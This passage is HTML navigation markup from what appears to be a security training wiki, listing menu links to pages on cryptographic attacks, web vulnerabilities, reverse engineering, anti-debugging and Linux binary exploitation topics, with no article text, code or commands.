                                    RSA
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/"
                                        title="RSA Introduction" class="md-nav__link">
                                        RSA Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/"
                                        title="Modulo-related Attacks" class="md-nav__link">
                                        Modulo-related Attacks
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/"
                                        title="Public Key Index Related Attacks" class="md-nav__link">
                                        Public Key Index Related Attacks
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/"
                                        title="Private Key d Related Attacks" class="md-nav__link">
                                        Private Key d Related Attacks
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/"
                                        title="Coppersmith Related Attacks" class="md-nav__link">
                                        Coppersmith Related Attacks
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/"
                                        title="Chosen Plain Cipher Attack" class="md-nav__link">
                                        Chosen Plain Cipher Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/"
                                        title="Side Channel Attack" class="md-nav__link">
                                        Side Channel Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/"
                                        title="Bleichenbacher Attack" class="md-nav__link">
                                        Bleichenbacher Attack
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/"
                                        title="Challenge Examples" class="md-nav__link">
                                        Challenge Examples
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" title="Knapsack Cipher"
                                  class="md-nav__link">
                                  Knapsack Cipher
                                </a>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-4" type="checkbox"
                                  id="nav-3-6-4">

                                <label class="md-nav__link" for="nav-3-6-4">
                                  Discrete Log Correlation
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-6-4">
                                    Discrete Log Correlation
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/"
                                        title="Discrete Logarithm" class="md-nav__link">
                                        Discrete Logarithm
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" title="Elgamal"
                                        class="md-nav__link">
                                        Elgamal
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh/" title="ECC"
                                        class="md-nav__link">
                                        ECC
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-6-5" type="checkbox"
                                  id="nav-3-6-5">

                                <label class="md-nav__link" for="nav-3-6-5">
                                  Lattice-based Cryptography
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-3-6-5">
                                    Lattice-based Cryptography
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/lattice/overview-zh/"
                                        title="Lattice Overview" class="md-nav__link">
                                        Lattice Overview
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/lattice/introduction-zh/"
                                        title="Introduction to Lattices" class="md-nav__link">
                                        Introduction to Lattices
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/"
                                        title="Lattice-based Algorithm" class="md-nav__link">
                                        Lattice-based Algorithm
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" title="CVP"
                                        class="md-nav__link">
                                        CVP
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">

                          <label class="md-nav__link" for="nav-3-7">
                            Hash Function
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-7">
                              Hash Function
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/introduction-zh/"
                                  title="Introduction to the Hash Function" class="md-nav__link">
                                  Introduction to the Hash Function
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/md5-zh/" title="MD5" class="md-nav__link">
                                  MD5
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/sha1-zh/" title="SHA1" class="md-nav__link">
                                  SHA1
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/fnv-zh/" title="FNV" class="md-nav__link">
                                  FNV
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/attack-zh/" title="Hash Attack" class="md-nav__link">
                                  Hash Attack
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/hash/complex-zh/" title="Challenge Examples"
                                  class="md-nav__link">
                                  Challenge Examples
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">

                          <label class="md-nav__link" for="nav-3-8">
                            Digital Signature
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-8">
                              Digital Signature
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/signature/introduction-zh/"
                                  title="Introduction to Digital Signatures" class="md-nav__link">
                                  Introduction to Digital Signatures
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/signature/rsa-zh/" title="RSA Digital Signature"
                                  class="md-nav__link">
                                  RSA Digital Signature
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/signature/elgamal-zh/" title="ElGamal Digital Signature"
                                  class="md-nav__link">
                                  ElGamal Digital Signature
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/signature/dsa-zh/" title="DSA Digital Signature"
                                  class="md-nav__link">
                                  DSA Digital Signature
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">

                          <label class="md-nav__link" for="nav-3-9">
                            Summary of Attack Techniques
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-3-9">
                              Summary of Attack Techniques
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/attack-summary/attack-mode-zh/" title="Introduction"
                                  class="md-nav__link">
                                  Introduction
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/"
                                  title="Intermediate Encounter Attack" class="md-nav__link">
                                  Intermediate Encounter Attack
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../crypto/attack-summary/bit-attack-zh/" title="Bit attack"
                                  class="md-nav__link">
                                  Bit attack
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../crypto/certificate/introduction-zh/" title="Certificate Format"
                            class="md-nav__link">
                            Certificate Format
                          </a>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">

                    <label class="md-nav__link" for="nav-4">
                      Web
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-4">
                        Web
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../web/introduction-zh/" title="Introduction to Web Applications"
                            class="md-nav__link">
                            Introduction to Web Applications
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../web/sqli-zh/" title="SQL Injection" class="md-nav__link">
                            SQL Injection
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../web/xss-zh/" title="XSS Cross-site Scripting Attack"
                            class="md-nav__link">
                            XSS Cross-site Scripting Attack
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../web/csrf-zh/" title="CSRF Cross-site Request Forgery"
                            class="md-nav__link">
                            CSRF Cross-site Request Forgery
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../web/ssrf-zh/" title="SSRF Server Request Forgery" class="md-nav__link">
                            SSRF Server Request Forgery
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../web/php/php-zh/" title="PHP Code Auditing" class="md-nav__link">
                            PHP Code Auditing
                          </a>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">

                    <label class="md-nav__link" for="nav-5">
                      Assembly
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-5">
                        Assembly
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item">
                          <a href="../../../../assembly/x86-x64/readme-zh/" title="x86_x64" class="md-nav__link">
                            x86_x64
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../assembly/mips/readme-zh/" title="mips" class="md-nav__link">
                            mips
                          </a>
                        </li>







                        <li class="md-nav__item">
                          <a href="../../../../assembly/arm/readme-zh/" title="arm" class="md-nav__link">
                            arm
                          </a>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">

                    <label class="md-nav__link" for="nav-6">
                      Executable
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-6">
                        Executable
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">

                          <label class="md-nav__link" for="nav-6-1">
                            ELF file
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-6-1">
                              ELF file
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../executable/elf/elf-structure-zh/" title="ELF File Basic Structure"
                                  class="md-nav__link">
                                  ELF File Basic Structure
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/elf/program-loading-zh/" title="Program Loading"
                                  class="md-nav__link">
                                  Program Loading
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/elf/program-linking-zh/" title="Program Link"
                                  class="md-nav__link">
                                  Program Link
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/elf/running-overview-zh/" title="Program Execution Flow"
                                  class="md-nav__link">
                                  Program Execution Flow
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">

                          <label class="md-nav__link" for="nav-6-2">
                            PE file
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-6-2">
                              PE file
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../executable/pe/pe-excutable-zh/" title="PE File Basic Structure"
                                  class="md-nav__link">
                                  PE File Basic Structure
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/pe/pe-import-table-zh/" title="PE Import Table"
                                  class="md-nav__link">
                                  PE Import Table
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/pe/pe-export-table-zh/" title="PE Export Table"
                                  class="md-nav__link">
                                  PE Export Table
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../executable/pe/pe-relocation-table-zh/" title="PE Relocation Table"
                                  class="md-nav__link">
                                  PE Relocation Table
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>


                      </ul>
                    </nav>
                  </li>







                  <li class="md-nav__item md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">

                    <label class="md-nav__link" for="nav-7">
                      Reverse Engineering
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-7">
                        Reverse Engineering
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">

                          <label class="md-nav__link" for="nav-7-1">
                            Reverse Overview
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-7-1">
                              Reverse Overview
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../../reverse/introduction-zh/"
                                  title="Software Reverse Engineering Introduction" class="md-nav__link">
                                  Software Reverse Engineering Introduction
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/"
                                  title="Common Encryption Algorithms and Code Recognition" class="md-nav__link">
                                  Common Encryption Algorithms and Code Recognition
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../reverse/maze/maze-zh/" title="Labyrinth Problem"
                                  class="md-nav__link">
                                  Labyrinth Problem
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../reverse/vm/vm-zh/" title="Virtual Machine Command Analysis"
                                  class="md-nav__link">
                                  Virtual Machine Command Analysis
                                </a>
                              </li>







                              <li class="md-nav__item">
                                <a href="../../../../reverse/unicorn/introduction-zh/"
                                  title="Unicorn Engine Introduction" class="md-nav__link">
                                  Unicorn Engine Introduction
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">

                          <label class="md-nav__link" for="nav-7-2">
                            Linux Reverse
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-7-2">
                              Linux Reverse
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-2-1" type="checkbox"
                                  id="nav-7-2-1">

                                <label class="md-nav__link" for="nav-7-2-1">
                                  Linux Reverse Technology
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-7-2-1">
                                    Linux Reverse Technology
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/linux/ld_preload-zh/" title="LD_PRELOAD"
                                        class="md-nav__link">
                                        LD_PRELOAD
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/linux/false-disasm-zh/"
                                        title="Incorrect Disassembly Fix" class="md-nav__link">
                                        Incorrect Disassembly Fix
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/linux/detect-bp-zh/"
                                        title="Detecting Breakpoints Bypassing" class="md-nav__link">
                                        Detecting Breakpoints Bypassing
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/linux/detect-dbg-zh/"
                                        title="Detecting Debugging Bypassing" class="md-nav__link">
                                        Detecting Debugging Bypassing
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">

                          <label class="md-nav__link" for="nav-7-3">
                            Windows Reverse
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-7-3">
                              Windows Reverse
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-1" type="checkbox"
                                  id="nav-7-3-1">

                                <label class="md-nav__link" for="nav-7-3-1">
                                  Shelling Technology
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-7-3-1">
                                    Shelling Technology
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/packer-introduction-zh/"
                                        title="Introduction to the Protective case" class="md-nav__link">
                                        Introduction to the Protective case
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/trace-zh/"
                                        title="Single Step Tracking Method" class="md-nav__link">
                                        Single Step Tracking Method
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/esp-zh/" title="ESP Law"
                                        class="md-nav__link">
                                        ESP Law
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/direct-oep-zh/"
                                        title="One Step to the OEP Method" class="md-nav__link">
                                        One Step to the OEP Method
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/memory-zh/"
                                        title="Memory Mirroring Method" class="md-nav__link">
                                        Memory Mirroring Method
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/last-exception-zh/"
                                        title="Last Exception Method" class="md-nav__link">
                                        Last Exception Method
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/sfx-zh/" title="SFX Method"
                                        class="md-nav__link">
                                        SFX Method
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/fix-iat-zh/"
                                        title="DUMP and IAT Reconstruction" class="md-nav__link">
                                        DUMP and IAT Reconstruction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/"
                                        title="Manually Find the IAT and Rebuild It Using ImportREC"
                                        class="md-nav__link">
                                        Manually Find the IAT and Rebuild It Using ImportREC
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/unpack/unpack-dll-zh/"
                                        title="DLL File Unpacking" class="md-nav__link">
                                        DLL File Unpacking
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-2" type="checkbox"
                                  id="nav-7-3-2">

                                <label class="md-nav__link" for="nav-7-3-2">
                                  Anti-debugging Technology
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-7-3-2">
                                    Anti-debugging Technology
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/"
                                        title="NtGlobalFlag" class="md-nav__link">
                                        NtGlobalFlag
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" title="Heap Flags"
                                        class="md-nav__link">
                                        Heap Flags
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" title="The Heap"
                                        class="md-nav__link">
                                        The Heap
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/int-3-zh/" title="Interrupt 3"
                                        class="md-nav__link">
                                        Interrupt 3
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/"
                                        title="IsDebuggerPresent" class="md-nav__link">
                                        IsDebuggerPresent
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/"
                                        title="CheckRemoteDebuggerPresent" class="md-nav__link">
                                        CheckRemoteDebuggerPresent
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/"
                                        title="NtQueryInformationProcess" class="md-nav__link">
                                        NtQueryInformationProcess
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/junk-code-zh/"
                                        title="Flower command" class="md-nav__link">
                                        Flower command
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../../../reverse/windows/anti-debug/example-zh/"
                                        title="Anti-debug technical example" class="md-nav__link">
                                        Anti-debug technical example
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>


                            </ul>
                          </nav>
                        </li>


                      </ul>
                    </nav>
                  </li>









                  <li class="md-nav__item md-nav__item--active md-nav__item--nested">

                    <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8" checked>

                    <label class="md-nav__link" for="nav-8">
                      Pwn
                    </label>
                    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
                      <label class="md-nav__title" for="nav-8">
                        Pwn
                      </label>
                      <ul class="md-nav__list" data-md-scrollfix>







                        <li class="md-nav__item md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">

                          <label class="md-nav__link" for="nav-8-1">
                            Pwn Overview
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-8-1">
                              Pwn Overview
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item">
                                <a href="../../../readme-zh/" title="Readme zh" class="md-nav__link">
                                  Readme zh
                                </a>
                              </li>


                            </ul>
                          </nav>
                        </li>









                        <li class="md-nav__item md-nav__item--active md-nav__item--nested">

                          <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2"
                            checked>

                          <label class="md-nav__link" for="nav-8-2">
                            Linux Pwn
                          </label>
                          <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
                            <label class="md-nav__title" for="nav-8-2">
                              Linux Pwn
                            </label>
                            <ul class="md-nav__list" data-md-scrollfix>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-1" type="checkbox"
                                  id="nav-8-2-1">

                                <label class="md-nav__link" for="nav-8-2-1">
                                  Security Protection Mechanism
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-1">
                                    Security Protection Mechanism
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../mitigation/canary-zh/" title="Canary" class="md-nav__link">
                                        Canary
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-2" type="checkbox"
                                  id="nav-8-2-2">

                                <label class="md-nav__link" for="nav-8-2-2">
                                  Stack Overflow
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-2">
                                    Stack Overflow
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/stack-intro-zh/" title="Stack Introduction"
                                        class="md-nav__link">
                                        Stack Introduction
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/stackoverflow-basic-zh/"
                                        title="Stack Overflow Principle" class="md-nav__link">
                                        Stack Overflow Principle
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/basic-rop-zh/" title="Basic ROP"
                                        class="md-nav__link">
                                        Basic ROP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/medium-rop-zh/" title="Intermediate ROP"
                                        class="md-nav__link">
                                        Intermediate ROP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/advanced-rop-zh/" title="Advanced ROP"
                                        class="md-nav__link">
                                        Advanced ROP
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../stackoverflow/fancy-rop-zh/" title="ROP Tricks"
                                        class="md-nav__link">
                                        ROP Tricks
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>







                              <li class="md-nav__item md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-3" type="checkbox"
                                  id="nav-8-2-3">

                                <label class="md-nav__link" for="nav-8-2-3">
                                  Format String Vulnerability
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-3">
                                    Format String Vulnerability
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../../fmtstr/fmtstr_intro-zh/"
                                        title="Format String Vulnerability Principle" class="md-nav__link">
                                        Format String Vulnerability Principle
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../fmtstr/fmtstr_exploit-zh/" title="Format String Exploit"
                                        class="md-nav__link">
                                        Format String Exploit
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../fmtstr/fmtstr_example-zh/"
                                        title="Format String Vulnerability Example" class="md-nav__link">
                                        Format String Vulnerability Example
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../../fmtstr/fmtstr_detect-zh/"
                                        title="Format String Vulnerability Detection" class="md-nav__link">
                                        Format String Vulnerability Detection
                                      </a>
                                    </li>


                                  </ul>
                                </nav>
                              </li>









                              <li class="md-nav__item md-nav__item--active md-nav__item--nested">

                                <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4" type="checkbox"
                                  id="nav-8-2-4" checked>

                                <label class="md-nav__link" for="nav-8-2-4">
                                  Glibc Heap Related
                                </label>
                                <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
                                  <label class="md-nav__title" for="nav-8-2-4">
                                    Glibc Heap Related
                                  </label>
                                  <ul class="md-nav__list" data-md-scrollfix>







                                    <li class="md-nav__item">
                                      <a href="../introduction-zh/" title="Introduction to Heap" class="md-nav__link">
                                        Introduction to Heap
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../heap_overview-zh/" title="Heap Overview" class="md-nav__link">
                                        Heap Overview
                                      </a>
                                    </li>







                                    <li class="md-nav__item">
                                      <a href="../heap_structure-zh/" title="Heap Related Data Structure"
                                        class="md-nav__link">
                                        Heap Related Data Structure
                                      </a>
                                    </li>







                                    <li class="md-nav__item md-nav__item--nested">

                                      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-4-4"
                                        type="checkbox" id="nav-8-2-4-4">

                                      <label class="md-nav__link" for="nav-8-2-4-4">
                                        In-depth Understanding of Ptmalloc2
                                      </label>
                                      <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
                                        <label class="md-nav__title" for="nav-8-2-4-4">
                                          In-depth Understanding of Ptmalloc2
                                        </label>
                                        <ul class="md-nav__list" data-md-scrollfix>







                                          <li class="md-nav__item">
                                            <a href="../implementation/overview-zh/" title="Implementation"
                                              class="md-nav__link">
                                              Implementation
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/basic-zh/"
                                              title="Basic Functions in the heap implementation" class="md-nav__link">
                                              Basic Functions in the heap implementation
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/heap-init-zh/" title="Heap Initialization"
                                              class="md-nav__link">
                                              Heap Initialization
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/malloc-zh/" title="Allocate Heap Memory"
                                              class="md-nav__link">
                                              Allocate Heap Memory
                                            </a>
                                          </li>







                                          <li class="md-nav__item">
                                            <a href="../implementation/free-zh/" title="Free Heap Memory"
                                              class="md-nav__link">
                                              Free Heap Memory
